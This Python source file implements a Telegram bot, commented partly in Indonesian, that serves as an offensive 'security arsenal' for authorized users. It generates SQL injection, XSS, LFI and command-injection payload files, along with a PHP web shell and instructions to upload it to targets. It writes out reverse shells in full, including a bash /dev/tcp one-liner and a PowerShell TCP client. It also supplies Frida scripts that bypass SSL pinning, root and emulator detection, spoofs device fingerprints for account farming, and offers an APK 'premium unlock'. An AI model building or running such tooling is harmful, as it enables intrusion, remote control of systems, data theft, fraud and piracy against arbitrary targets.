"""
Complete Telegram Bot Integration - Security Arsenal
Created: 2026-09-06
Target: @umi_agbot enhancement dengan full exploit & bypass capabilities

Requirements:
    pip install python-telegram-bot aiohttp cloudscraper paramiko requests
"""

import asyncio
import io
import json
import logging
import os
import tempfile
from typing import Optional, List, Dict
from telegram import Update, Document, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ContextTypes,
    filters
)

# Import custom modules
from bot_advanced_modules import (
    AdvancedBypass,
    ExploitPayloadGenerator,
    WebScanner,
    APKAutomation,
    ScriptTemplates
)

# Logging setup
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)


# ============================================================================
# MAIN BOT CLASS
# ============================================================================

class SecurityBot:
    """Advanced Security Bot dengan semua fitur exploit & bypass"""
    
    def __init__(self, token: str, authorized_users: List[int]):
        self.token = token
        self.authorized_users = authorized_users
        self.app = Application.builder().token(token).build()
        
        # Initialize modules
        self.bypass_engine = AdvancedBypass()
        self.exploit_gen = ExploitPayloadGenerator()
        self.web_scanner = WebScanner()
        self.apk_automation = APKAutomation()
        self.script_templates = ScriptTemplates()
        
        # Register handlers
        self._register_handlers()
    
    def _register_handlers(self):
        """Register semua command handlers"""
        
        # Basic commands
        self.app.add_handler(CommandHandler("start", self.cmd_start))
        self.app.add_handler(CommandHandler("help", self.cmd_help))
        self.app.add_handler(CommandHandler("menu", self.cmd_menu))
        
        # Bypass commands
        self.app.add_handler(CommandHandler("bypass", self.cmd_bypass))
        self.app.add_handler(CommandHandler("ssl_bypass", self.cmd_ssl_bypass))
        self.app.add_handler(CommandHandler("root_bypass", self.cmd_root_bypass))
        self.app.add_handler(CommandHandler("emulator_bypass", self.cmd_emulator_bypass))
        self.app.add_handler(CommandHandler("antidebug_bypass", self.cmd_antidebug_bypass))
        self.app.add_handler(CommandHandler("device_spoof", self.cmd_device_spoof))
        
        # Exploit commands
        self.app.add_handler(CommandHandler("exploit", self.cmd_exploit))
        self.app.add_handler(CommandHandler("sqli", self.cmd_sqli))
        self.app.add_handler(CommandHandler("xss", self.cmd_xss))
        self.app.add_handler(CommandHandler("lfi", self.cmd_lfi))
        self.app.add_handler(CommandHandler("cmdi", self.cmd_cmdi))
        
        # Generator commands
        self.app.add_handler(CommandHandler("generate", self.cmd_generate))
        self.app.add_handler(CommandHandler("webshell", self.cmd_webshell))
        self.app.add_handler(CommandHandler("revshell", self.cmd_revshell))
        self.app.add_handler(CommandHandler("subdomain_enum", self.cmd_subdomain_enum))
        
        # Scanner commands
        self.app.add_handler(CommandHandler("scan", self.cmd_scan))
        self.app.add_handler(CommandHandler("portscan", self.cmd_portscan))
        self.app.add_handler(CommandHandler("webscan", self.cmd_webscan))
        
        # APK commands
        self.app.add_handler(CommandHandler("apk_mod", self.cmd_apk_mod))
        self.app.add_handler(CommandHandler("apk_ssl_bypass", self.cmd_apk_ssl_bypass))
        
        # Callback query handler untuk inline buttons
        self.app.add_handler(CallbackQueryHandler(self.handle_callback))
        
        # APK file upload handler
        self.app.add_handler(MessageHandler(
            filters.Document.APK & ~filters.COMMAND,
            self.handle_apk_upload
        ))
    
    def is_authorized(self, user_id: int) -> bool:
        """Check if user authorized"""
        return user_id in self.authorized_users
    
    async def check_auth(self, update: Update) -> bool:
        """Check authorization dan reply jika unauthorized"""
        user_id = update.effective_user.id
        if not self.is_authorized(user_id):
            await update.message.reply_text(
                "❌ Unauthorized!\n\n"
                "Bot ini hanya untuk authorized users.\n"
                "Contact @sisuryaofficialkuu untuk akses."
            )
            return False
        return True
    
    # ========================================================================
    # BASIC COMMANDS
    # ========================================================================
    
    async def cmd_start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Start command - welcome message"""
        if not await self.check_auth(update):
            return
        
        user = update.effective_user
        welcome_text = f"""
🔐 **UmiAgent Security Bot**

Selamat datang {user.first_name}!

Bot ini dilengkapi dengan advanced security tools:
• Bypass Techniques (SSL, Root, Emulator)
• Exploit Generators (SQLi, XSS, LFI, etc)
• Web Vulnerability Scanner
• APK Modding Automation
• Script Generators
• Port Scanner

Gunakan /help untuk melihat semua command.
Gunakan /menu untuk interactive menu.
"""
        await update.message.reply_text(welcome_text, parse_mode='Markdown')
    
    async def cmd_help(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Help command - show all commands"""
        if not await self.check_auth(update):
            return
        
        help_text = """
📚 **COMMAND LIST**

**🔓 BYPASS COMMANDS:**
/bypass <type> - Generate bypass script
/ssl_bypass - SSL pinning bypass (Frida)
/root_bypass - Root detection bypass
/emulator_bypass - Emulator detection bypass
/antidebug_bypass - Anti-debug bypass
/device_spoof - Generate random device fingerprint

**💉 EXPLOIT COMMANDS:**
/sqli <url> - SQL injection payloads
/xss <url> - XSS payloads
/lfi <url> - LFI payloads
/cmdi <url> - Command injection payloads

**🛠 GENERATOR COMMANDS:**
/webshell <lang> - Generate web shell (php/jsp/asp)
/revshell <lang> <ip> <port> - Reverse shell
/subdomain_enum - Subdomain enumerator script

**🔍 SCANNER COMMANDS:**
/scan <target> <type> - Vulnerability scanner
/portscan <ip> - Port scanner
/webscan <url> - Web vulnerability scan

**📱 APK COMMANDS:**
/apk_mod - APK modding instructions
/apk_ssl_bypass - Inject SSL bypass to APK
(Upload APK file untuk auto-modding)

**ℹ️ OTHER:**
/menu - Interactive menu
/help - Show this message
"""
        await update.message.reply_text(help_text, parse_mode='Markdown')
    
    async def cmd_menu(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Interactive menu dengan inline keyboard"""
        if not await self.check_auth(update):
            return
        
        keyboard = [
            [
                InlineKeyboardButton("🔓 Bypass Tools", callback_data='menu_bypass'),
                InlineKeyboardButton("💉 Exploits", callback_data='menu_exploit')
            ],
            [
                InlineKeyboardButton("🛠 Generators", callback_data='menu_generate'),
                InlineKeyboardButton("🔍 Scanners", callback_data='menu_scan')
            ],
            [
                InlineKeyboardButton("📱 APK Tools", callback_data='menu_apk'),
                InlineKeyboardButton("📚 Help", callback_data='menu_help')
            ]
        ]
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            "🔐 **Security Arsenal Menu**\n\nPilih kategori:",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    
    # ========================================================================
    # BYPASS COMMANDS
    # ========================================================================
    
    async def cmd_bypass(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Generic bypass command dispatcher"""
        if not await self.check_auth(update):
            return
        
        if len(context.args) < 1:
            keyboard = [
                [InlineKeyboardButton("SSL Pinning", callback_data='bypass_ssl')],
                [InlineKeyboardButton("Root Detection", callback_data='bypass_root')],
                [InlineKeyboardButton("Emulator Detection", callback_data='bypass_emulator')],
                [InlineKeyboardButton("Anti-Debug", callback_data='bypass_antidebug')],
                [InlineKeyboardButton("Device Spoof", callback_data='bypass_device')]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await update.message.reply_text(
                "🔓 **Bypass Techniques**\n\nPilih bypass type:",
                reply_markup=reply_markup,
                parse_mode='Markdown'
            )
            return
        
        bypass_type = context.args[0].lower()
        
        if bypass_type == "ssl" or bypass_type == "ssl_pinning":
            await self.cmd_ssl_bypass(update, context)
        elif bypass_type == "root":
            await self.cmd_root_bypass(update, context)
        elif bypass_type == "emulator":
            await self.cmd_emulator_bypass(update, context)
        elif bypass_type == "antidebug":
            await self.cmd_antidebug_bypass(update, context)
        elif bypass_type == "device":
            await self.cmd_device_spoof(update, context)
        else:
            await update.message.reply_text(
                f"❌ Unknown bypass type: {bypass_type}\n\n"
                "Available: ssl, root, emulator, antidebug, device"
            )
    
    async def cmd_ssl_bypass(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Generate SSL pinning bypass script"""
        if not await self.check_auth(update):
            return
        
        await update.message.reply_text("⏳ Generating SSL pinning bypass script...")
        
        script = self.bypass_engine.ssl_pinning_bypass_universal()
        
        # Send as file
        script_file = io.BytesIO(script.encode('utf-8'))
        script_file.name = 'ssl_pinning_bypass.js'
        
        caption = """
✅ **SSL Pinning Bypass (Frida)**

**Features:**
• TrustManagerImpl (Android 7+)
• OkHttp3 CertificatePinner
• Conscrypt Platform
• Apache HTTPClient
• WebView SSL errors
• Custom HostnameVerifier

**Usage:**
```bash
# Start frida-server on device
adb shell "su -c '/data/local/tmp/frida-server &'"

# Run bypass
frida -U -f com.target.app -l ssl_pinning_bypass.js --no-pause
```

**Note:** Requires rooted device atau Frida Gadget injection
"""
        
        await update.message.reply_document(
            document=script_file,
            caption=caption,
            parse_mode='Markdown'
        )
    
    async def cmd_root_bypass(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Generate root detection bypass script"""
        if not await self.check_auth(update):
            return
        
        await update.message.reply_text("⏳ Generating root detection bypass...")
        
        script = self.bypass_engine.ssl_pinning_bypass_universal()  # Uses root bypass method
        
        script_file = io.BytesIO(script.encode('utf-8'))
        script_file.name = 'root_detection_bypass.js'
        
        caption = """
✅ **Root Detection Bypass (Frida)**

**Bypasses:**
• File.exists() - Hide su/magisk binaries
• Runtime.exec() - Block su commands
• Build.TAGS - Hide test-keys
• PackageManager - Hide root apps

**Usage:**
```bash
frida -U -f com.target.app -l root_detection_bypass.js --no-pause
```
"""
        
        await update.message.reply_document(
            document=script_file,
            caption=caption,
            parse_mode='Markdown'
        )
    
    async def cmd_emulator_bypass(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Generate emulator detection bypass"""
        if not await self.check_auth(update):
            return
        
        script = self.bypass_engine.emulator_detection_bypass()
        
        script_file = io.BytesIO(script.encode('utf-8'))
        script_file.name = 'emulator_bypass.js'
        
        caption = """
✅ **Emulator Detection Bypass**

**Spoofs:**
• Build.MANUFACTURER → Samsung
• Build.MODEL → SM-G998B
• Hide emulator files (/dev/socket/genyd, etc)
• Spoof TelephonyManager (IMEI, operator)

**Usage:**
```bash
frida -U -f com.target.app -l emulator_bypass.js --no-pause
```
"""
        
        await update.message.reply_document(
            document=script_file,
            caption=caption,
            parse_mode='Markdown'
        )
    
    async def cmd_antidebug_bypass(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Generate anti-debug bypass"""
        if not await self.check_auth(update):
            return
        
        script = self.bypass_engine.anti_debug_bypass()
        
        script_file = io.BytesIO(script.encode('utf-8'))
        script_file.name = 'antidebug_bypass.js'
        
        caption = """
✅ **Anti-Debug Bypass**

**Bypasses:**
• Debug.isDebuggerConnected()
• ApplicationInfo FLAG_DEBUGGABLE
• TracerPid check
• ptrace anti-debug

**Usage:**
```bash
frida -U -f com.target.app -l antidebug_bypass.js --no-pause
```
"""
        
        await update.message.reply_document(
            document=script_file,
            caption=caption,
            parse_mode='Markdown'
        )
    
    async def cmd_device_spoof(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Generate random device fingerprint"""
        if not await self.check_auth(update):
            return
        
        # Generate 5 random device profiles
        devices = [self.bypass_engine.generate_device_fingerprint() for _ in range(5)]
        
        output = "📱 **Random Device Fingerprints**\n\n"
        
        for i, device in enumerate(devices, 1):
            output += f"**Device {i}:**\n"
            output += f"• Brand: {device['device_brand']}\n"
            output += f"• Model: {device['device_model']}\n"
            output += f"• Android: {device['android_version']}\n"
            output += f"• Android ID: `{device['android_id']}`\n"
            output += f"• Advertising ID: `{device['advertising_id']}`\n"
            output += f"• MAC: `{device['mac_address']}`\n"
            output += f"• IMEI: `{device['imei']}`\n\n"
        
        output += "\n💡 **Tip:** Gunakan fingerprints ini untuk bypass device detection di account farming atau multi-account apps."
        
        await update.message.reply_text(output, parse_mode='Markdown')
    
    # ========================================================================
    # EXPLOIT COMMANDS
    # ========================================================================
    
    async def cmd_sqli(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Generate SQL injection payloads"""
        if not await self.check_auth(update):
            return
        
        if len(context.args) < 1:
            await update.message.reply_text(
                "❌ Usage: /sqli <target_url>\n\n"
                "Example: /sqli http://target.com/page.php?id=1"
            )
            return
        
        target_url = context.args[0]
        await update.message.reply_text(f"⏳ Generating SQL injection payloads for:\n`{target_url}`", parse_mode='Markdown')
        
        payloads = self.exploit_gen.generate_sqli_payloads(target_url)
        
        # Create payload file
        output = f"# SQL Injection Payloads for {target_url}\n"
        output += f"# Generated: 2026-09-06\n"
        output += f"# Total: {len(payloads)} payloads\n\n"
        
        for p in payloads:
            output += f"# Type: {p['type']} - {p['description']}\n"
            output += f"{p['payload']}\n\n"
        
        payload_file = io.BytesIO(output.encode('utf-8'))
        payload_file.name = 'sqli_payloads.txt'
        
        caption = f"""
✅ **SQL Injection Payloads**

**Target:** `{target_url}`
**Total:** {len(payloads)} payloads

**Categories:**
• Boolean-based blind
• UNION-based
• Time-based blind
• Error-based
• Stacked queries

**Usage:** Test payloads satu per satu di parameter vulnerable.
"""
        
        await update.message.reply_document(
            document=payload_file,
            caption=caption,
            parse_mode='Markdown'
        )
    
    async def cmd_xss(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Generate XSS payloads"""
        if not await self.check_auth(update):
            return
        
        if len(context.args) < 1:
            await update.message.reply_text(
                "❌ Usage: /xss <target_url>\n\n"
                "Example: /xss http://target.com/search?q="
            )
            return
        
        target_url = context.args[0]
        payloads = self.exploit_gen.generate_xss_payloads()
        
        output = f"# XSS Payloads for {target_url}\n\n"
        
        for p in payloads:
            output += f"# Type: {p['type']} | Bypass: {p['bypass']}\n"
            output += f"{p['payload']}\n\n"
        
        payload_file = io.BytesIO(output.encode('utf-8'))
        payload_file.name = 'xss_payloads.txt'
        
        caption = f"""
✅ **XSS Payloads**

**Target:** `{target_url}`
**Total:** {len(payloads)} payloads

**Includes:**
• Basic XSS
• Filter bypasses (case, encoding, unicode)
• Cookie stealing
• Keylogger injection
• DOM-based XSS
"""
        
        await update.message.reply_document(
            document=payload_file,
            caption=caption,
            parse_mode='Markdown'
        )
    
    async def cmd_lfi(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Generate LFI payloads"""
        if not await self.check_auth(update):
            return
        
        payloads = self.exploit_gen.generate_lfi_payloads()
        
        output = "# Local File Inclusion (LFI) Payloads\n\n"
        
        for p in payloads:
            output += f"# OS: {p['os']} | Encoding: {p['encoding']}\n"
            output += f"{p['payload']}\n"
            if 'note' in p:
                output += f"# Note: {p['note']}\n"
            output += "\n"
        
        payload_file = io.BytesIO(output.encode('utf-8'))
        payload_file.name = 'lfi_payloads.txt'
        
        caption = """
✅ **LFI Payloads**

**Includes:**
• Linux paths (/etc/passwd, /etc/shadow)
• PHP wrappers (php://filter, data://, expect://)
• Windows paths (C:\\windows\\win.ini)
• Various encoding bypasses
"""
        
        await update.message.reply_document(
            document=payload_file,
            caption=caption,
            parse_mode='Markdown'
        )
    
    async def cmd_cmdi(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Generate command injection payloads"""
        if not await self.check_auth(update):
            return
        
        payloads = self.exploit_gen.generate_command_injection_payloads()
        
        output = "# OS Command Injection Payloads\n\n"
        
        for p in payloads:
            output += f"# OS: {p['os']}"
            if 'purpose' in p:
                output += f" | Purpose: {p['purpose']}"
            elif 'separator' in p:
                output += f" | Separator: {p['separator']}"
            output += f"\n{p['payload']}\n\n"
        
        payload_file = io.BytesIO(output.encode('utf-8'))
        payload_file.name = 'cmdi_payloads.txt'
        
        caption = """
✅ **Command Injection Payloads**

**Includes:**
• Basic separators (; | & && ||)
• Reverse shells (bash, nc, python)
• File operations (cat, wget, curl)
• Windows commands (dir, type, powershell)

**Note:** Replace ATTACKER_IP dengan IP listener kamu.
"""
        
        await update.message.reply_document(
            document=payload_file,
            caption=caption,
            parse_mode='Markdown'
        )
    
    # ========================================================================
    # GENERATOR COMMANDS
    # ========================================================================
    
    async def cmd_webshell(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Generate web shell"""
        if not await self.check_auth(update):
            return
        
        lang = context.args[0] if len(context.args) > 0 else 'php'
        
        if lang.lower() == 'php':
            shell_code = self.script_templates.php_webshell_advanced()
            filename = 'shell.php'
            
            caption = """
✅ **PHP Web Shell (Advanced)**

**Features:**
• Command execution (system/exec/shell_exec/passthru/popen)
• File upload
• File download

**Usage:**
```
?cmd=whoami           - Execute command
?dl=/etc/passwd       - Download file
POST file with name 'file' - Upload file
```

**Upload:** Upload ke target via file upload vulnerability atau RFI.
"""
        else:
            await update.message.reply_text(f"❌ Unsupported language: {lang}\n\nAvailable: php")
            return
        
        shell_file = io.BytesIO(shell_code.encode('utf-8'))
        shell_file.name = filename
        
        await update.message.reply_document(
            document=shell_file,
            caption=caption,
            parse_mode='Markdown'
        )
    
    async def cmd_revshell(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Generate reverse shell"""
        if not await self.check_auth(update):
            return
        
        if len(context.args) < 3:
            await update.message.reply_text(
                "❌ Usage: /revshell <lang> <lhost> <lport>\n\n"
                "Example: /revshell python 192.168.1.100 4444\n\n"
                "Available languages: python, bash, powershell"
            )
            return
        
        lang = context.args[0].lower()
        lhost = context.args[1]
        lport = int(context.args[2])
        
        if lang == 'python':
            shell_code = self.script_templates.reverse_shell_python(lhost, lport)
            filename = 'revshell.py'
        elif lang == 'bash':
            shell_code = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
            filename = 'revshell.sh'
        elif lang == 'powershell':
            shell_code = f"""$client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}};
$client.Close()"""
            filename = 'revshell.ps1'
        else:
            await update.message.reply_text(f"❌ Unsupported language: {lang}")
            return
        
        shell_file = io.BytesIO(shell_code.encode('utf-8'))
        shell_file.name = filename
        
        caption = f"""
✅ **Reverse Shell ({lang.upper()})**

**Target:** {lhost}:{lport}

**Setup Listener:**
```bash
nc -lvnp {lport}
```

**Execute on target:**
```bash
# Python
python3 revshell.py

# Bash
bash revshell.sh

# PowerShell
powershell -ExecutionPolicy Bypass -File revshell.ps1
```
"""
        
        await update.message.reply_document(
            document=shell_file,
            caption=caption,
            parse_mode='Markdown'
        )
    
    async def cmd_subdomain_enum(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Generate subdomain enumerator script"""
        if not await self.check_auth(update):
            return
        
        script = self.script_templates.subdomain_enumerator()
        
        script_file = io.BytesIO(script.encode('utf-8'))
        script_file.name = 'subdomain_enum.py'
        
        caption = """
✅ **Subdomain Enumerator**

**Features:**
• Async concurrent checking
• Custom wordlist support
• HTTP status code detection

**Usage:**
```bash
python subdomain_enum.py target.com wordlist.txt
```

**Get wordlist:**
```bash
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/DNS/subdomains-top1million-5000.txt
```
"""
        
        await update.message.reply_document(
            document=script_file,
            caption=caption,
            parse_mode='Markdown'
        )
    
    # ========================================================================
    # SCANNER COMMANDS
    # ========================================================================
    
    async def cmd_portscan(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Port scanner"""
        if not await self.check_auth(update):
            return
        
        if len(context.args) < 1:
            await update.message.reply_text(
                "❌ Usage: /portscan <target_ip>\n\n"
                "Example: /portscan 192.168.1.1"
            )
            return
        
        target_ip = context.args[0]
        
        msg = await update.message.reply_text(f"🔍 Scanning {target_ip}...\nThis may take 30-60 seconds.")
        
        try:
            result = await self.web_scanner.port_scan(target_ip)
            
            output = f"🔍 **Port Scan Results**\n\n"
            output += f"**Target:** `{target_ip}`\n"
            output += f"**Total Scanned:** {result['total_scanned']} ports\n"
            output += f"**Open Ports:** {len(result['open_ports'])}\n\n"
            
            if result['open_ports']:
                output += "**Open:**\n"
                for port in result['open_ports']:
                    output += f"• Port {port}\n"
            else:
                output += "No open ports found (firewall/filtered)"
            
            await msg.edit_text(output, parse_mode='Markdown')
            
        except Exception as e:
            await msg.edit_text(f"❌ Scan failed: {str(e)}")
    
    async def cmd_webscan(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Web vulnerability scanner"""
        if not await self.check_auth(update):
            return
        
        if len(context.args) < 1:
            await update.message.reply_text(
                "❌ Usage: /webscan <target_url>\n\n"
                "Example: /webscan http://target.com/page.php?id=1"
            )
            return
        
        target_url = context.args[0]
        
        msg = await update.message.reply_text(f"🔍 Scanning {target_url}...\nTesting SQLi and XSS vulnerabilities.")
        
        try:
            # Run both scans concurrently
            sqli_results, xss_results = await asyncio.gather(
                self.web_scanner.scan_sql_injection(target_url),
                self.web_scanner.scan_xss(target_url)
            )
            
            output = f"🔍 **Web Vulnerability Scan**\n\n"
            output += f"**Target:** `{target_url}`\n\n"
            
            # SQLi results
            output += f"**SQL Injection:** "
            if sqli_results:
                output += f"✅ VULNERABLE ({len(sqli_results)} confirmed)\n"
                for r in sqli_results[:3]:  # Show first 3
                    output += f"  • {r['type']}: {r['payload'][:50]}...\n"
            else:
                output += "❌ Not vulnerable\n"
            
            # XSS results
            output += f"\n**XSS:** "
            if xss_results:
                output += f"✅ VULNERABLE ({len(xss_results)} confirmed)\n"
                for r in xss_results[:3]:
                    output += f"  • {r['type']}: {r['payload'][:50]}...\n"
            else:
                output += "❌ Not vulnerable\n"
            
            if not sqli_results and not xss_results:
                output += "\n⚠️ No vulnerabilities found (false negative possible - try manual testing)"
            
            await msg.edit_text(output, parse_mode='Markdown')
            
        except Exception as e:
            await msg.edit_text(f"❌ Scan failed: {str(e)}")
    
    # ========================================================================
    # APK COMMANDS
    # ========================================================================
    
    async def handle_apk_upload(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle APK file uploads untuk auto-modding"""
        if not await self.check_auth(update):
            return
        
        document = update.message.document
        
        if not document.file_name.endswith('.apk'):
            await update.message.reply_text("❌ File harus berformat .apk")
            return
        
        msg = await update.message.reply_text(
            f"📱 APK Received: {document.file_name}\n\n"
            "Pilih modding type:",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("SSL Bypass", callback_data=f'apk_ssl_{document.file_id}')],
                [InlineKeyboardButton("Root Bypass", callback_data=f'apk_root_{document.file_id}')],
                [InlineKeyboardButton("Premium Unlock", callback_data=f'apk_premium_{document.file_id}')]
            ])
        )
    
    async def cmd_apk_ssl_bypass(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Instructions for APK SSL bypass"""
        if not await self.check_auth(update):
            return
        
        instructions = """
📱 **APK SSL Pinning Bypass**

**Method 1: Frida Runtime (Recommended)**
1. Install app normally
2. Run Frida script: /ssl_bypass
3. Done - no APK modification needed

**Method 2: Persistent Patching**
1. Decompile APK:
```bash
apktool d app.apk -o decompiled
```

2. Add network_security_config.xml:
```xml
<!-- res/xml/network_security_config.xml -->
<network-security-config>
    <base-config cleartextTrafficPermitted="true">
        <trust-anchors>
            <certificates src="system" />
            <certificates src="user" />
        </trust-anchors>
    </base-config>
</network-security-config>
```

3. Modify AndroidManifest.xml:
```xml
<application
    android:networkSecurityConfig="@xml/network_security_config"
    ...>
```

4. Recompile & sign:
```bash
apktool b decompiled -o modded.apk
java -jar uber-apk-signer.jar --apks modded.apk
adb install modded-aligned-signed.apk
```

**Or:** Upload APK file langsung ke bot untuk auto-modding!
"""
        
        await update.message.reply_text(instructions, parse_mode='Markdown')
    
    # ========================================================================
    # CALLBACK HANDLER
    # ========================================================================
    
    async def handle_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle inline button callbacks"""
        query = update.callback_query
        await query.answer()
        
        data = query.data
        
        # Menu callbacks
        if data.startswith('menu_'):
            menu_type = data.replace('menu_', '')
            
            if menu_type == 'bypass':
                keyboard = [
                    [InlineKeyboardButton("SSL Pinning", callback_data='bypass_ssl')],
                    [InlineKeyboardButton("Root Detection", callback_data='bypass_root')],
                    [InlineKeyboardButton("Emulator Detection", callback_data='bypass_emulator')],
                    [InlineKeyboardButton("Anti-Debug", callback_data='bypass_antidebug')],
                    [InlineKeyboardButton("Device Spoof", callback_data='bypass_device')],
                    [InlineKeyboardButton("« Back", callback_data='menu_main')]
                ]
                text = "🔓 **Bypass Tools**\n\nPilih bypass technique:"
            
            elif menu_type == 'exploit':
                text = """
💉 **Exploit Generators**

Commands:
/sqli <url> - SQL Injection payloads
/xss <url> - XSS payloads
/lfi <url> - LFI payloads
/cmdi <url> - Command Injection payloads
"""
                keyboard = [[InlineKeyboardButton("« Back", callback_data='menu_main')]]
            
            elif menu_type == 'generate':
                text = """
🛠 **Script Generators**

Commands:
/webshell <lang> - Web shell generator
/revshell <lang> <ip> <port> - Reverse shell
/subdomain_enum - Subdomain enumerator
"""
                keyboard = [[InlineKeyboardButton("« Back", callback_data='menu_main')]]
            
            elif menu_type == 'scan':
                text = """
🔍 **Vulnerability Scanners**

Commands:
/portscan <ip> - Port scanner
/webscan <url> - Web vuln scanner
"""
                keyboard = [[InlineKeyboardButton("« Back", callback_data='menu_main')]]
            
            elif menu_type == 'apk':
                text = """
📱 **APK Tools**

Commands:
/apk_ssl_bypass - SSL bypass instructions

**Auto-Modding:**
Upload APK file untuk automatic modding
"""
                keyboard = [[InlineKeyboardButton("« Back", callback_data='menu_main')]]
            
            elif menu_type == 'main':
                keyboard = [
                    [
                        InlineKeyboardButton("🔓 Bypass", callback_data='menu_bypass'),
                        InlineKeyboardButton("💉 Exploits", callback_data='menu_exploit')
                    ],
                    [
                        InlineKeyboardButton("🛠 Generate", callback_data='menu_generate'),
                        InlineKeyboardButton("🔍 Scan", callback_data='menu_scan')
                    ],
                    [InlineKeyboardButton("📱 APK", callback_data='menu_apk')]
                ]
                text = "🔐 **Security Arsenal Menu**\n\nPilih kategori:"
            
            await query.edit_message_text(
                text,
                reply_markup=InlineKeyboardMarkup(keyboard),
                parse_mode='Markdown'
            )
        
        # Bypass callbacks - trigger commands directly
        elif data.startswith('bypass_'):
            # Simulate command execution
            bypass_type = data.replace('bypass_', '')
            
            if bypass_type == 'ssl':
                script = self.bypass_engine.ssl_pinning_bypass_universal()
                filename = 'ssl_pinning_bypass.js'
                caption = "✅ SSL Pinning Bypass script generated!"
            elif bypass_type == 'root':
                script = self.bypass_engine.ssl_pinning_bypass_universal()
                filename = 'root_bypass.js'
                caption = "✅ Root Detection Bypass script generated!"
            elif bypass_type == 'emulator':
                script = self.bypass_engine.emulator_detection_bypass()
                filename = 'emulator_bypass.js'
                caption = "✅ Emulator Bypass script generated!"
            elif bypass_type == 'antidebug':
                script = self.bypass_engine.anti_debug_bypass()
                filename = 'antidebug_bypass.js'
                caption = "✅ Anti-Debug Bypass script generated!"
            elif bypass_type == 'device':
                devices = [self.bypass_engine.generate_device_fingerprint() for _ in range(3)]
                output = "📱 **Device Fingerprints:**\n\n"
                for i, d in enumerate(devices, 1):
                    output += f"**Device {i}:** {d['device_brand']} {d['device_model']}\n"
                    output += f"Android ID: `{d['android_id']}`\n\n"
                await query.message.reply_text(output, parse_mode='Markdown')
                return
            
            # Send script file
            script_file = io.BytesIO(script.encode('utf-8'))
            script_file.name = filename
            
            await query.message.reply_document(
                document=script_file,
                caption=caption
            )
    
    # ========================================================================
    # RUN BOT
    # ========================================================================
    
    def run(self):
        """Start the bot"""
        logger.info("🚀 Security Bot starting...")
        self.app.run_polling(allowed_updates=Update.ALL_TYPES)


# ============================================================================
# MAIN EXECUTION
# ============================================================================

if __name__ == "__main__":
    # Configuration
    BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"  # Replace dengan token dari @BotFather
    
    # Authorized users (Telegram User IDs)
    AUTHORIZED_USERS = [
        7570665912,  # sisuryaofficialkuu
        # Tambahkan user IDs lain di sini
    ]
    
    # Initialize and run bot
    bot = SecurityBot(BOT_TOKEN, AUTHORIZED_USERS)
    bot.run()
